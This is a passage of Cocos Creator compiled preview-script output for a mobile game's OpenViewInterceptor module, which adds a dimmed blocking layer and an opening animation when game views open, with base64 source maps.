vcmFnZVwiLCB0aGlzLm9uVXBkYXRlU3RvcmFnZUV2ZW50LCB0aGlzKTtcclxuICAgIH1cclxuXHJcbiAgICBvblVwZGF0ZVN0b3JhZ2VFdmVudChrZXk6c3RyaW5nKXtcclxuICAgICAgICBpZiAoa2V5ID09IFwicG93ZXJcIil7XHJcbiAgICAgICAgfSBlbHNlIGlmIChrZXkgPT0gXCJnb2xkQ291bnRcIil7XHJcbiAgICAgICAgICAgIHRoaXMuZ29sZExhYmVsLnN0cmluZyA9IGA8Yj48b3V0bGluZSBjb2xvcj0jMWUxZTFlIHdpZHRoPTM+JHtleHQuc2hvcnRGb3JtYXQoV29ybGQuU3RvcmFnZS5nb2xkQ291bnQpfTwvb3V0bGluZT48L2I+YDtcclxuICAgICAgICB9IGVsc2UgaWYgKGtleSA9PSBcImRpYW1vbmRDb3VudFwiKXtcclxuICAgICAgICB9XHJcbiAgICB9XHJcblxyXG4gICAgdXBkYXRlVmlldygpIHtcclxuICAgICAgICB0aGlzLmdvbGRMYWJlbC5zdHJpbmcgPSBgPGI+PG91dGxpbmUgY29sb3I9IzFlMWUxZSB3aWR0aD0zPiR7ZXh0LnNob3J0Rm9ybWF0KFdvcmxkLlN0b3JhZ2UuZ29sZENvdW50KX08L291dGxpbmU+PC9iPmA7XHJcbiAgICB9XHJcblxyXG4gICAgYXN5bmMgb25DbGlja1BsdXModmVudCwgZGF0YSl7XHJcbiAgICAgICAgY29uc29sZS5sb2coXCLjgJBjbGlja+OAkVRvcENvbnRyb2xsZXIgUGx1c1wiKVxyXG5cclxuICAgICAgICBkYXRhID0gcGFyc2VJbnQoZGF0YSk7XHJcbiAgICAgICAgbGV0IFtub2RlXSA9IGF3YWl0IEZhY2FkZS5leGVjdXRlQ29tbWFuZChcIk9wZW5WaWV3Q29tbWFuZFwiLCBcInByZWZhYi9leGNoYW5nZVwiKTtcclxuICAgICAgICBsZXQgZXhjaGFuZ2VDb250cm9sbGVyID0gbm9kZS5nZXRDb21wb25lbnQoXCJFeGNoYW5nZUNvbnRyb2xsZXJcIik7XHJcbiAgICAgICAgZXhjaGFuZ2VDb250cm9sbGVyLnR5cGUgPSBkYXRhO1xyXG4gICAgfVxyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/interceptor/OpenViewInterceptor.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '27753peuxhLZrjjPlvjamxu', 'OpenViewInterceptor');
// script/app/interceptor/OpenViewInterceptor.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
Object.defineProperty(exports, "__esModule", { value: true });
var Facade_1 = require("../../../framework/facade/Facade");
var LifeCycle_1 = require("../../../framework/component/LifeCycle");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var BLOCK_LAYER_NAME_PREV = "blockLayer==>";
var OpenViewInterceptor = /** @class */ (function () {
    function OpenViewInterceptor() {
    }
    OpenViewInterceptor_1 = OpenViewInterceptor;
    OpenViewInterceptor.onceAwait = function (viewPath, event) {
        return __awaiter(this, void 0, void 0, function () {
            var blockLayer;
            return __generator(this, function (_a) {
                blockLayer = Facade_1.default.canvasNode.getChildByName("" + (BLOCK_LAYER_NAME_PREV + viewPath));
                if (blockLayer) {
                    return [2 /*return*/, blockLayer.onceAwait(event)];
                }
                else {
                    console.error("not found view==>" + viewPath);
                }
                return [2 /*return*/];
            });
        });
    };
    /**
     * 打开view之前处理
     * @param args 打窗口的参数
     *
     * 说明：
     * 1.如果要给阻塞层添加灰色的背景，则可以在preHandle中给this.blockLayer.addComponent(cc.Sprite);
     * 2.如果要在两个界面间插入一个界面，则可以在此处拦截并阻塞消息，直到插入的界面关闭(await Facade.canvasNode.onceAwait(xxx));
     * 3.如果要在打开窗口和其他事件同时进行的任务。比如打开窗口的同时请求网络数据，等网络数据到达时刷新界面。(Promise.all([p1, p2]));
     * */
    OpenViewInterceptor.prototype.preHandle = function () {
        var args = [];
        for (var _i = 0; _i < arguments.length; _i++) {
            args[_i] = arguments[_i];
        }
        return __awaiter(this, void 0, Promise, function () {
            var _this = this;
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve, reject) { return __awaiter(_this, void 0, void 0, function () {
                        var colorPrefab, blockLayer, colorSpriteFrame;
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0: return [4 /*yield*/, cc.loader.loadResAwait("prefab/color", cc.Prefab)];
                                case 1:
                                    colorPrefab = _a.sent();
                                    blockLayer = new cc.Node("" + (BLOCK_LAYER_NAME_PREV + args[0]));
                                    blockLayer.on(cc.Node.EventType.TOUCH_START, function (event) {
                                        console.log("\u70B9\u51FB\u4E86\u963B\u585E\u5C42touch start=>" + blockLayer.name);
                                    });
                                    blockLayer.addComponent(cc.BlockInputEvents);
                                    colorSpriteFrame = cc.instantiate(colorPrefab).getComponent(cc.Sprite).spriteFrame;
                                    blockLayer.addComponent(cc.Sprite).spriteFrame = colorSpriteFrame;
                                    blockLayer.color = cc.Color.BLACK;
                                    blockLayer.opacity = 0;
                                    blockLayer.setContentSize(cc.view.getVisibleSize());
                                    Facade_1.default.canvasNode.addChild(blockLayer);
                                    blockLayer.runAction(cc.fadeTo(1, 150));
                                    resolve(true);
                                    return [2 /*return*/];
                            }
                        });
                    }); })];
            });
        });
    };
    /**
     * 打开view之后处理
     * @param node 打开窗口的node
     * @param args 打开窗口的参数
     *
     * 说明：
     * 1.如果要处理点击阻塞层就关闭窗口，则在postHandle中监听this.blockLayer的Touch事件即可处理.
     * 2.如果要添加打开窗口的动画，则在postHandle中处理，如调用this.moveDownToFocus(res)等方法
     * */
    OpenViewInterceptor.prototype.postHandle = function (node) {
        var args = [];
        for (var _i = 1; _i < arguments.length; _i++) {
            args[_i - 1] = arguments[_i];
        }
        return __awaiter(this, void 0, Promise, function () {
            var _this = this;
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve, reject) { return __awaiter(_this, void 0, void 0, function () {
                        var blockLayer, lifeCycle;
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0:
                                    blockLayer = Facade_1.default.canvasNode.getChildByName("" + (BLOCK_LAYER_NAME_PREV + args[0]));
                                    blockLayer.emit(OpenViewInterceptor_1.BlockLayerEvent.viewCreateFinish, node);
                                    lifeCycle = node.addComponent(LifeCycle_1.default);
                                    lifeCycle.addCall("onDestroy", function () {
                                        blockLayer.emit(OpenViewInterceptor_1.BlockLayerEvent.destroy);
                                        blockLayer.destroy();
                                    });
                                    if (!(args[0] == "prefab/task")) return [3 /*break*/, 2];
                                    cc.director.getScene().getChildByName('top').active = true;
                                    return [4 /*yield*/, this.moveDownToFocus(node)];
                                case 1:
                                    _a.sent();
                                    return [3 /*break*/, 3];
                                case 2:
                                    if (args[0] == 'prefab/gameover') {
                                        cc.director.getScene().getChildByName('top').active = true;
                                    }
                                    _a.label = 3;
                                case 3:
                                    blockLayer.emit(OpenViewInterceptor_1.BlockLayerEvent.viewDisplayFinish, node);
                                    resolve();
                                    return [2 /*return*/];
                            }
                        });
                    }); })];
            });
        });
    };
    /** 打开窗口的特效 */
    /** 从屏幕下方弹出 */
    OpenViewInterceptor.prototype.moveDownToFocus = function (node) {
        return __awaiter(this, void 0, void 0, function () {
            var x, y;
            return __generator(this, function (_a) {
                switch (_a.label) {
                    case 0:
                        x = node.x;
                        y = node.y;
                        node.y = y - cc.view.getVisibleSize().height;
                        return [4 /*yield*/, node.runActionAwait(cc.moveTo(1.2, x, y).easing(cc.easeElasticOut(0.6)))];
                    case 1:
                        _a.sent();
                        return [2 /*return*/];
                }
            });
        });
    };
    var OpenViewInterceptor_1;
    OpenViewInterceptor.BlockLayerEvent = {
        destroy: "destroy",
        viewCreateFinish: "viewCreateFinish",
        viewDisplayFinish: "viewDisplayFinish",
    };
    OpenViewInterceptor = OpenViewInterceptor_1 = __decorate([
        ccclass
    ], OpenViewInterceptor);
    return OpenViewInterceptor;
}());
exports.default = OpenViewInterceptor;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2ludGVyY2VwdG9yL09wZW5WaWV3SW50ZXJjZXB0b3IudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7O0FBQUEsb0JBQW9CO0FBQ3BCLGlGQUFpRjtBQUNqRix5RkFBeUY7QUFDekYsbUJBQW1CO0FBQ25CLDJGQUEyRjtBQUMzRixtR0FBbUc7QUFDbkcsOEJBQThCO0FBQzlCLDJGQUEyRjtBQUMzRixtR0FBbUc7O0FBR25HLDJEQUFzRDtBQUN0RCxvRUFBK0Q7QUFFekQsSUFBQSxLQUFzQixFQUFFLENBQUMsVUFBVSxFQUFsQyxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQWlCLENBQUM7QUFFMUMsSUFBTSxxQkFBcUIsR0FBRyxlQUFlLENBQUM7QUFLOUM7SUFBQTtJQXNGQSxDQUFDOzRCQXRGb0IsbUJBQW1CO0lBUXZCLDZCQUFTLEdBQXRCLFVBQXVCLFFBQWUsRUFBRSxLQUFZOzs7O2dCQUM1QyxVQUFVLEdBQUcsZ0JBQU0sQ0FBQyxVQUFVLENBQUMsY0FBYyxDQUFDLE1BQUcscUJBQXFCLEdBQUUsUUFBUSxDQUFFLENBQUMsQ0FBQztnQkFDeEYsSUFBSSxVQUFVLEVBQUM7b0JBQ1gsc0JBQU8sVUFBVSxDQUFDLFNBQVMsQ0FBQyxLQUFLLENBQUMsRUFBQztpQkFDdEM7cUJBQU07b0JBQ0gsT0FBTyxDQUFDLEtBQUssQ0FBQyxtQkFBbUIsR0FBQyxRQUFRLENBQUMsQ0FBQztpQkFDL0M7Ozs7S0FDSjtJQUVEOzs7Ozs7OztTQVFLO0lBQ0MsdUNBQVMsR0FBZjtRQUFnQixjQUFPO2FBQVAsVUFBTyxFQUFQLHFCQUFPLEVBQVAsSUFBTztZQUFQLHlCQUFPOzt1Q0FBRSxPQUFPOzs7Z0JBQzVCLHNCQUFPLElBQUksT0FBTyxDQUFVLFVBQU0sT0FBTyxFQUFFLE1BQU07Ozs7d0NBQzNCLHFCQUFNLEVBQUUsQ0FBQyxNQUFNLENBQUMsWUFBWSxDQUFDLGNBQWMsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFD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QUMsZUFBZSxDQUFDLGlCQUFpQixFQUFFLElBQUksQ0FBQyxDQUFDO29DQUM3RSxPQUFPLEVBQUUsQ0FBQzs7Ozt5QkFDYixDQUFDLEVBQUM7OztLQUNOO0lBR0QsY0FBYztJQUVkLGNBQWM7SUFDUiw2Q0FBZSxHQUFyQixVQUFzQixJQUFZOzs7Ozs7d0JBQzFCLENBQUMsR0FBRyxJQUFJLENBQUMsQ0FBQyxDQUFDO3dCQUNYLENBQUMsR0FBRyxJQUFJLENBQUMsQ0FBQyxDQUFDO3dCQUNmLElBQUksQ0FBQyxDQUFDLEdBQUcsQ0FBQyxHQUFHLEVBQUUsQ0FBQyxJQUFJLENBQUMsY0FBYyxFQUFFLENBQUMsTUFBTSxDQUFDO3dCQUM3QyxxQkFBTSxJQUFJLENBQUMsY0FBYyxDQUFDLEVBQUUsQ0FBQyxNQUFNLENBQUMsR0FBRyxFQUFFLENBQUMsRUFBRSxDQUFDLENBQUMsQ0FBQyxNQUFNLENBQUMsRUFBRSxDQUFDLGNBQWMsQ0FBQyxHQUFHLENBQUMsQ0FBQyxDQUFDLEVBQUE7O3dCQUE5RSxTQUE4RSxDQUFDOzs7OztLQUNsRjs7SUFsRk0sbUNBQWUsR0FBRTtRQUNwQixPQUFPLEVBQUcsU0FBUztRQUNuQixnQkFBZ0IsRUFBRyxrQkFBa0I7UUFDckMsaUJBQWlCLEVBQUcsbUJBQW1CO0tBQzFDLENBQUM7SUFOZSxtQkFBbUI7UUFEdkMsT0FBTztPQUNhLG1CQUFtQixDQXNGdkM7SUFBRCwwQkFBQztDQXRGRCxBQXNGQyxJQUFBO2tCQXRGb0IsbUJBQW1CIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiLy8gTGVhcm4gVHlwZVNjcmlwdDpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvdHlwZXNjcmlwdC5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvdHlwZXNjcmlwdC5odG1sXHJcbi8vIExlYXJuIEF0dHJpYnV0ZTpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvcmVmZXJlbmNlL2F0dHJpYnV0ZXMuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL3JlZmVyZW5jZS9hdHRyaWJ1dGVzLmh0bWxcclxuLy8gTGVhcm4gbGlmZS1jeWNsZSBjYWxsYmFja3M6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL2xpZmUtY3ljbGUtY2FsbGJhY2tzLmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy9saWZlLWN5Y2xlLWNhbGxiYWNrcy5odG1sXHJcblxyXG5pbXBvcnQge0lDb21tYW5kSW50ZXJjZXB0b3J9IGZyb20gXCIuLi8uLi8uLi9mcmFtZXdvcmsvaW50ZXJjZXB0b3IvQ29tbWFuZEludGVyY2VwdG9yXCI7XHJcbmltcG9ydCBGYWNhZGUgZnJvbSBcIi4uLy4uLy4uL2ZyYW1ld29yay9mYWNhZGUvRmFjYWRlXCI7XHJcbmltcG9ydCBMaWZlQ3ljbGUgZnJvbSBcIi4uLy4uLy4uL2ZyYW1ld29yay9jb21wb25lbnQvTGlmZUN5Y2xlXCI7XHJcblxyXG5jb25zdCB7Y2NjbGFzcywgcHJvcGVydHl9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbmNvbnN0IEJMT0NLX0xBWUVSX05BTUVfUFJFViA9IFwiYmxvY2tMYXllcj09PlwiO1xyXG5cclxuXHJcblxyXG5AY2NjbGFzc1xyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBPcGVuVmlld0ludGVyY2VwdG9yIGltcGxlbWVudHMgSUNvbW1hbmRJbnRlcmNlcHRvciB7XHJcblxyXG4gICAgc3RhdGljIEJsb2NrTGF5ZXJFdmVudCA9e1xyXG4gICAgICAgIGRlc3Ryb3kgOiBcImRlc3Ryb3lcIixcclxuICAgICAgICB2aWV3Q3JlYXRlRmluaXNoIDogXCJ2aWV3Q3JlYXRlRmluaXNoXCIsXHJcbiAgICAgICAgdmlld0Rpc3BsYXlGaW5pc2ggOiBcInZpZXdEaXNwbGF5RmluaXNoXCIsXHJcbiAgICB9O1xyXG5cclxuICAgIHN0YXRpYyBhc3luYyBvbmNlQXdhaXQodmlld1BhdGg6c3RyaW5nLCBldmVudDpzdHJpbmcpe1xyXG4gICAgICAgIGxldCBibG9ja0xheWVyID0gRmFjYWRlLmNhbnZhc05vZGUuZ2V0Q2hpbGRCeU5hbWUoYCR7QkxPQ0tfTEFZRVJfTkFNRV9QUkVWICt2aWV3UGF0aH1gKTtcclxuICAgICAgICBpZiAoYmxvY2tMYXllcil7XHJcbiAgICAgICAgICAgIHJldHVybiBibG9ja0xheWVyLm9uY2VBd2FpdChldmVudCk7XHJcbiAgICAgICAgfSBlbHNlIHtcclxuICAgICAgICAgICAgY29uc29sZS5lcnJvcihcIm5vdCBmb3VuZCB2aWV3PT0+XCIrdmlld1BhdGgpO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICAvKipcclxuICAgICAqIOaJk+W8gHZpZXfkuYvliY3lpITnkIZcclxuICAgICAqIEBwYXJhbSBhcmdzIOaJk+eql+WPo+eahOWPguaVsFxyXG4gICAgICpcclxuICAgICAqIOivtOaYju+8mlxyXG4gICAgICogMS7lpoLmnpzopoHnu5npmLvloZ7lsYLmt7vliqDngbDoibLnmoTog4zmma/vvIzliJnlj6/ku6XlnKhwcmVIYW5kbGXkuK3nu5l0aGlzLmJsb2NrTGF5ZXIuYWRkQ29tcG9uZW50KGNjLlNwcml0ZSk7XHJcbiAgICAgKiAyLuWmguaenOimgeWcqOS4pOS4queVjOmdoumXtOaPkuWFpeS4gOS4queVjOmdou+8jOWImeWPr+S7peWcqOatpOWkhOaLpuaIquW5tumYu+Whnua2iOaBr++8jOebtOWIsOaPkuWFpeeahOeVjOmdouWFs+mXrShhd2FpdCBGYWNhZGUuY2FudmFzTm9kZS5vbmNlQXdhaXQoeHh4KSk7XHJcbiAgICAgKiAzLuWmguaenOimgeWcqOaJk+W8gOeql+WPo+WSjOWFtuS7luS6i+S7tuWQjOaXtui/m+ihjOeahOS7u+WKoeOAguavlOWmguaJk+W8gOeql+WPo+eahOWQjOaXtuivt+axgue9kee7nOaVsOaNru+8jOetiee9kee7nOaVsOaNruWIsOi+vuaXtuWIt+aWsOeVjOmdouOAgihQcm9taXNlLmFsbChbcDEsIHAyXSkpO1xyXG4gICAgICogKi9cclxuICAgIGFzeW5jIHByZUhhbmRsZSguLi5hcmdzKTpQcm9taXNlPGJvb2xlYW4+e1xyXG4gICAgICAgIHJldHVybiBuZXcgUHJvbWlzZTxib29sZWFuPihhc3luYyhyZXNvbHZlLCByZWplY3QpID0+IHtcclxuICAgICAgICAgICAgbGV0IGNvbG9yUHJlZmFiID0gYXdhaXQgY2MubG9hZGVyLmxvYWRSZXNBd2FpdChcInByZWZhYi9jb2xvclwiLCBjYy5QcmVmYWIpO1xyXG4gICAgICAgICAgICAvKiog5re75Yqg6Zi75aGe5bGCICovXHJcbiAgICAgICAgICAgIGxldCBibG9ja0xheWVyID0gbmV3IGNjLk5vZGUoYCR7QkxPQ0tfTEFZRVJfTkFNRV9QUkVWICsgYXJnc1swXX1gKTtcclxuICAgICAgICAgICAgYmxvY2tMYXllci5vbihjYy5Ob2RlLkV2ZW50VHlwZS5UT1VDSF9TVEFSVCwgKGV2ZW50KT0+e1xyXG4gICAgICAgICAgICAgICAgY29uc29sZS5sb2coYOeCueWHu+S6humYu+WhnuWxgnRvdWNoIHN0YXJ0PT4ke2Jsb2NrTGF5ZXIubmFtZX1gKTtcclxuICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgIGJsb2NrTGF5ZXIuYWRkQ29tcG9uZW50KGNjLkJsb2NrSW5wdXRFdmVudHMpO1xyXG4gICAgICAgICAgICBsZXQgY29sb3JTcHJpdGVGcmFtZSA9IGNjLmluc3RhbnRpYXRlKGNvbG9yUHJlZmFiKS5nZXRDb21wb25lbnQoY2MuU3ByaXRlKS5zcHJpdGVGcmFtZTtcclxuICAgICAgICAgICAgYmxvY2tMYXllci5hZGRDb21wb25lbnQoY2MuU3ByaXRlKS5zcHJpdGVGcmFtZSA9IGNvbG9yU3ByaXRlRnJhbWU7XHJcbiAgICAgICAgICAgIGJsb2NrTGF5ZXIuY29sb3IgPSBjYy5Db2xvci5CTEFDSztcclxuICAgICAgICAgICAgYmxvY2tMYXllci5vcGFjaXR5ID0gMDtcclxuICAgICAgICAgICAgYmxvY2tMYXllci5zZXRDb250ZW50U2l6ZShjYy52aWV3LmdldFZpc2libGVTaXplKCkpO1xyXG4gICAgICAgICAgICBGYWNhZGUuY2FudmFzTm9kZS5hZGRDaGlsZChibG9ja0xheWVyKTtcclxuICAgICAgICAgICAgYmxvY2tMYXllci5ydW5BY3Rpb24oY2MuZmFkZVRvKDEsIDE1MCkpO1xyXG4gICAgICAgICAgICByZXNvbHZlKHRydWUpO1xyXG4gICAgICAgIH0pO1xyXG4gICAgfVxyXG4gICAgLyoqXHJcbiAgICAgKiDmiZPlvIB2aWV35LmL5ZCO5aSE55CGXHJcbiAgICAgKiBAcGFyYW0gbm9kZSDmiZPlvIDnqpflj6PnmoRub2RlXHJcbiAgICAgKiBAcGFyYW0gYXJncyDmiZPlvIDnqpflj6PnmoTlj4LmlbBcclxuICAgICAqXHJcbiAgICAgKiDor7TmmI7vvJpcclxuICAgICAqIDEu5aaC5p6c6KaB5aSE55CG54K55Ye76Zi75aGe5bGC5bCx5YWz6Zet56qX5Y+j77yM5YiZ5ZyocG9zdEhhbmRsZeS4reebkeWQrHRoaXMuYmxvY2tMYXllcueahFRvdWNo5LqL5Lu25Y2z5Y+v5aSE55CGLlxyXG4gICAgICogMi7lpoLmnpzopoHmt7vliqDmiZPlvIDnqpflj6PnmoTliqjnlLvvvIzliJnlnKhwb3N0SGFuZGxl5Lit5aSE55CG77yM5aaC6LCD55SodGhpcy5tb3ZlRG93blRvRm9jdXMocmVzKeetieaWueazlVxyXG4gICAgICogKi9cclxuICAgIGFzeW5jIHBvc3RIYW5kbGUobm9kZTphbnksIC4uLmFyZ3MpOlByb21pc2V7XHJcbiAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlKGFzeW5jKHJlc29sdmUsIHJlamVjdCkgPT4ge1xyXG4gICAgICAgICAgICBsZXQgYmxvY2tMYXllciA9IEZhY2FkZS5jYW52YXNOb2RlLmdldENoaWxkQnlOYW1lKGAke0JMT0NLX0xBWUVSX05BTUVfUFJFViArYXJnc1swXX1gKTtcclxuICAgICAgICAgICAgYmxvY2tMYXllci5lbWl0KE9wZW5WaWV3SW50ZXJjZXB0b3IuQmxvY2tMYXllckV2ZW50LnZpZXdDcmVhdGVGaW5pc2gsIG5vZGUpO1xyXG4gICAgICAgICAgICAvKiog5bCG6Zi75aGe5bGC5LiO6IqC54K555qEZGVzdHJveeeUn+WRveWRqOacn+e7keWumiAqL1xyXG4gICAgICAgICAgICBsZXQgbGlmZUN5Y2xlID0gbm9kZS5hZGRDb21wb25lbnQoTGlmZUN5Y2xlKTtcclxuICAgICAgICAgICAgbGlmZUN5Y2xlLmFkZENhbGwoXCJvbkRlc3Ryb3lcIiwgKCk9PiB7XHJcbiAgICAgICAgICAgICAgICBibG9ja0xheWVyLmVtaXQoT3BlblZpZXdJbnRlcmNlcHRvci5CbG9ja0xheWVyRXZlbnQuZGVzdHJveSk7XHJcbiAgICAgICAgICAgICAgICBibG9ja0xheWVyLmRlc3Ryb3koKTtcclxuICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgIGlmIChhcmdzWzBdID09IFwicHJlZmFiL3Rhc2tcIil7XHJcbiAgICAgICAgICAgICAgICBjYy5kaXJlY3Rvci5nZXRTY2VuZSgpLmdldENoaWxkQnlOYW1lKCd0b3AnKS5hY3RpdmUgPSB0cnVlO1xyXG4gICAgICAgICAgICAgICAgYXdhaXQgdGhpcy5tb3ZlRG93blRvRm9jdXMobm9kZSk7XHJcbiAgICAgICAgICAgIH1lbHNlIGlmIChhcmdzWzBdID09ICdwcmVmYWIvZ2FtZW92ZXInKXtcclxuICAgICAgICAgICAgICAgIGNjLmRpcmVjdG9yLmdldFNjZW5lKCkuZ2V0Q2hpbGRCeU5hbWUoJ3RvcCcpLmFjdGl2ZSA9IHRydWU7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgYmxvY2tMYXllci5lbWl0KE9wZW5WaWV3SW50ZXJjZXB0b3IuQmxvY2tMYXllckV2ZW50LnZpZXdEaXNwbGF5RmluaXNoLCBub2RlKTtcclxuICAgICAgICAgICAgcm